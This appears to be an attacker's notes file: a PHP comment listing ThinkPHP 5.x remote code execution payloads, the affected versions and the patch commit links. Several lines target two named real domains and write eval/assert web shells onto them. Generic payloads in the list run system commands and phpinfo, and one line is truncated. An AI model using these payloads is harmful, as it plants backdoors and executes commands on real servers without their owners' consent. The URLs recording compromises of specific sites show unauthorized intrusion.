<?php
/*
//唐人街发现漏洞
域名/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=zxc1.php&vars[1][]=<?php @eval($_POST[fuck]);?>'

api.91tangrenjie.com/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=fff.php&vars[1][1]=<?php print_R(scandir('/www/wwwroot/api.91tangrenjie.com/application/admin'))?>

api.91tangrenjie.com/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shix1.php&vars[1][1]=<?php assert($_POST['fuck'])?>

//米多发现
api.6d2g.cn/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=tt.php&vars[1][]=<?php @eval($_POST[111]);?>

?s=index/\think\Request/input&filter=phpinfo&data=1
?s=index/\think\Request/input&filter=system&data=id
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=
?s=index/\think\view\driver\Php/display&content=
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0



5.x < 5.1.31, <= 5.0.23


Thinkphp v5.0.x补丁地址: https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f


Thinkphp v5.1.x补丁地址: https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815
